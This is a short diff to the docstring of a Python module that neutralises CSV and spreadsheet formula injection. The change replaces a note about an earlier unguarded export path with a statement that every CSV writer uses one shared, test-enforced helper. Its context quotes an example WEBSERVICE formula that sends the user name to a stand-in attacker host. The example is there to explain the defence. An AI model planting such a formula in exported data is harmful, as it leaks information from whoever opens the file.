@@ -8,13 +8,10 @@ Without neutralization, ``=WEBSERVICE("https://attacker.tld/?u="&USER())``
 in a hostname would exfiltrate the moment an analyst opens the
 spreadsheet.
 
-This module hoists the previously-private ``_csv_safe`` / ``_safe_csv_row``
-helpers out of :mod:`app.api.v1.endpoints.reports` so every CSV writer
-in the codebase can share one implementation.  Pre-v2.86.4 the
-test-plan-execution branch in :mod:`app.services.export_service` wrote
-raw cells through :func:`csv.writer.writerow`, bypassing the guard
-entirely — a real injection vector for ``host_hostname``,
-``command_run``, and ``findings_summary``.
+Every CSV writer in the codebase uses this one implementation: each row
+goes through :func:`safe_csv_row` (an AST guard in
+``tests/test_review_2026_10_16_t4.py`` refuses a ``writerow`` of anything
+but a header of constant words).
 """
 from __future__ import annotations
 
